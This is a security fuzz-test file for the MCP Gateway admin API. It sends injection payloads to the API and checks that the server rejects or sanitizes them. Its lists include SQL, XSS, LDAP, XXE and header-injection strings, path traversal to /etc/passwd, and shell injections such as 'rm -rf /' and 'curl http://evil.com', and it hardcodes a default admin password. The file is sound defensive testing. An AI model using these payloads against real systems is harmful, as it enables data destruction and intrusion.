# -*- coding: utf-8 -*-
"""Location: ./tests/fuzz/test_security_fuzz.py
Copyright 2025
SPDX-License-Identifier: Apache-2.0
Authors: Mihai Criveti

Security-focused fuzz testing for MCP Gateway.
"""

# Third-Party
from fastapi.testclient import TestClient
from hypothesis import given
from hypothesis import strategies as st
import pytest

# First-Party
from mcpgateway.main import app


class TestSecurityFuzzing:
    """Security-focused fuzzing tests."""

    @given(st.text(min_size=1, max_size=1000))
    def test_sql_injection_resistance(self, malicious_input):
        """Test resistance to SQL injection in various fields."""
        client = TestClient(app)

        # Test SQL injection patterns in tool creation
        sql_patterns = [
            malicious_input,
            "'; DROP TABLE tools; --",
            "' OR '1'='1",
            "'; INSERT INTO tools (name) VALUES ('hacked'); --",
            "' UNION SELECT * FROM users --",
            "\"; DELETE FROM tools WHERE '1'='1'; --",
        ]

        for pattern in sql_patterns:
            # Test in tool name field
            payload = {"name": pattern, "url": "http://example.com", "description": "test"}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should not crash, may reject invalid input
            assert response.status_code in [200, 201, 400, 401, 422]

            # Test in description field
            payload = {"name": "test-tool", "url": "http://example.com", "description": pattern}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            assert response.status_code in [200, 201, 400, 401, 422]

    @given(st.text().filter(lambda x: any(char in x for char in "<>\"'&")))
    def test_xss_prevention(self, potentially_malicious):
        """Test XSS prevention in user inputs."""
        client = TestClient(app)

        xss_patterns = [
            potentially_malicious,
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "</script><script>alert('xss')</script>",
            "' onmouseover='alert(\"xss\")'",
            "\"><script>alert('xss')</script>",
        ]

        for pattern in xss_patterns:
            # Test in description field that might be rendered
            payload = {"name": "test-tool", "url": "http://example.com", "description": pattern}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should handle potentially malicious content safely
            assert response.status_code in [200, 201, 400, 401, 422]

            if response.status_code in [200, 201]:
                # If accepted, verify no raw script tags in admin interface
                admin_response = client.get("/admin", headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

                # Raw script tags should not appear unescaped
                if "<script>" in pattern.lower():
                    assert "<script>" not in admin_response.text.lower()

    @given(st.integers(min_value=-(2**31), max_value=2**31))
    def test_integer_overflow_handling(self, large_int):
        """Test handling of integer overflow in numeric fields."""
        client = TestClient(app)

        # Test in ID fields and numeric parameters
        response = client.get(f"/admin/tools/{large_int}", headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

        # Should handle large integers gracefully
        assert response.status_code in [200, 400, 401, 404, 422]

        # Test in port numbers and other numeric fields
        payload = {"name": "test-tool", "url": f"http://example.com:{large_int}", "description": "test"}

        response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

        assert response.status_code in [200, 201, 400, 401, 422]

    def test_path_traversal_resistance(self):
        """Test resistance to path traversal attacks."""
        client = TestClient(app)

        path_traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/log/../../../../etc/passwd",
        ]

        for pattern in path_traversal_patterns:
            # Test in URL fields
            payload = {"name": "test-tool", "url": f"file://{pattern}", "description": "test"}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should reject or sanitize path traversal attempts
            assert response.status_code in [200, 201, 400, 401, 422]

            # Test in other string fields
            payload = {"name": pattern, "url": "http://example.com", "description": pattern}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            assert response.status_code in [200, 201, 400, 401, 422]

    @given(st.text(min_size=1, max_size=500))
    def test_command_injection_resistance(self, input_text):
        """Test resistance to command injection attacks."""
        client = TestClient(app)

        command_injection_patterns = [
            input_text,
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "& ping google.com",
            "|| curl http://evil.com",
            "'; system('rm -rf /'); '",
        ]

        for pattern in command_injection_patterns:
            payload = {
                "name": "test-tool",
                "url": "http://example.com",
                "description": pattern,
                "jsonpath_filter": pattern,  # Test in JSONPath filter which might be processed
            }

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should not execute commands or crash
            assert response.status_code in [200, 201, 400, 401, 422]

    def test_header_injection_resistance(self):
        """Test resistance to HTTP header injection attacks."""
        client = TestClient(app)

        header_injection_patterns = [
            "Value\r\nX-Injected: true",
            "Value\nSet-Cookie: injected=true",
            "Value\r\n\r\n<script>alert('xss')</script>",
            "Value%0d%0aX-Injected:%20true",
            "Value\x0d\x0aX-Injected: true",
        ]

        for pattern in header_injection_patterns:
            # Test in custom headers
            payload = {"name": "test-tool", "url": "http://example.com", "headers": {"Custom-Header": pattern, "Another-Header": pattern}}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should sanitize or reject header injection attempts
            assert response.status_code in [200, 201, 400, 401, 422]

    @given(st.text(min_size=1, max_size=200))
    def test_ldap_injection_resistance(self, input_text):
        """Test resistance to LDAP injection attacks."""
        client = TestClient(app)

        ldap_patterns = [
            input_text,
            "*)(&(objectClass=*)",
            "*)(mail=*))(|(mail=*",
            "admin)(&(password=*))",
            "*)(&(|(objectClass=*)(uid=*))",
        ]

        for pattern in ldap_patterns:
            # Test in authentication fields if they exist
            payload = {"name": "test-tool", "url": "http://example.com", "auth": {"auth_type": "basic", "username": pattern, "password": pattern}}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            assert response.status_code in [200, 201, 400, 401, 422]

    def test_xml_injection_resistance(self):
        """Test resistance to XML injection attacks."""
        client = TestClient(app)

        xml_patterns = [
            "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
            "]]></value></item><item><name>injected</name><value>test",
            "<![CDATA[</value></item><item><name>injected</name><value>test]]>",
            "&lt;script&gt;alert('xss')&lt;/script&gt;",
        ]

        for pattern in xml_patterns:
            payload = {"name": "test-tool", "url": "http://example.com", "description": pattern}

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should handle XML content safely
            assert response.status_code in [200, 201, 400, 401, 422]

    @given(st.binary(min_size=1, max_size=1000))
    def test_binary_input_handling(self, binary_data):
        """Test handling of binary data in text fields."""
        client = TestClient(app)

        try:
            # Try to decode as various encodings
            text_data = binary_data.decode("utf-8", errors="ignore")

            payload = {
                "name": text_data[:50],  # Limit length
                "url": "http://example.com",
                "description": text_data[:500],
            }

            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})

            # Should handle binary/non-UTF8 data gracefully
            assert response.status_code in [200, 201, 400, 401, 422]

        except (UnicodeDecodeError, ValueError):
            # Expected for some binary data
            pass

    def test_authentication_bypass_attempts(self):
        """Test various authentication bypass attempts."""
        client = TestClient(app)

        bypass_attempts = [
            "",  # Empty auth
            "Basic",  # Incomplete basic auth
            "Basic " + "x" * 1000,  # Very long auth
            "Bearer fake_token",  # Wrong auth type
            "Basic YWRtaW46YWRtaW4=",  # admin:admin (wrong password)
            "Basic cm9vdDpyb290",  # root:root
            "Basic " + ":" * 100,  # Many colons
            "Admin admin:changeme",  # Wrong scheme
        ]

        for auth in bypass_attempts:
            headers = {"Authorization": auth} if auth else {}

            response = client.get("/admin/tools", headers=headers)

            # Should require proper authentication
            if auth != "Basic YWRtaW46Y2hhbmdlbWU=":  # Correct auth
                assert response.status_code in [401, 400, 422]

    @given(st.integers(min_value=0, max_value=1000))
    def test_dos_resistance_large_requests(self, size_multiplier):
        """Test resistance to DoS via large requests."""
        client = TestClient(app)

        # Create increasingly large payloads
        large_string = "x" * (size_multiplier * 100)

        payload = {"name": f"tool_{size_multiplier}", "url": "http://example.com", "description": large_string, "tags": [f"tag_{i}" for i in range(min(size_multiplier, 100))]}

        try:
            response = client.post(
                "/admin/tools",
                json=payload,
                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="},
                timeout=10,  # Prevent hanging
            )

            # Should handle large requests gracefully (may reject)
            assert response.status_code in [200, 201, 400, 413, 422]

        except Exception:
            # Timeout or other errors are acceptable for very large requests
            pass

    def test_cors_security(self):
        """Test CORS configuration security."""
        client = TestClient(app)

        malicious_origins = [
            "http://evil.com",
            "https://phishing-site.com",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
        ]

        for origin in malicious_origins:
            response = client.options("/admin/tools", headers={"Origin": origin, "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "Authorization"})

            # Should not allow arbitrary origins
            cors_header = response.headers.get("Access-Control-Allow-Origin", "")
            if cors_header == "*":
                pytest.fail("CORS wildcard (*) allows any origin - security risk")

            # Should not echo back malicious origins
            if origin in cors_header and "evil" in origin.lower():
                pytest.fail(f"CORS echoing back potentially malicious origin: {origin}")

    def test_rate_limiting_behavior(self):
        """Test rate limiting behavior."""
        client = TestClient(app)

        # Make many rapid requests
        responses = []
        for i in range(20):
            response = client.post("/admin/tools", json={"name": f"rapid_tool_{i}", "url": "http://example.com"}, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
            responses.append(response.status_code)

        # Should either accept all or start rate limiting
        # Rate limiting typically returns 429
        for status in responses:
            assert status in [200, 201, 400, 401, 422, 429, 409]
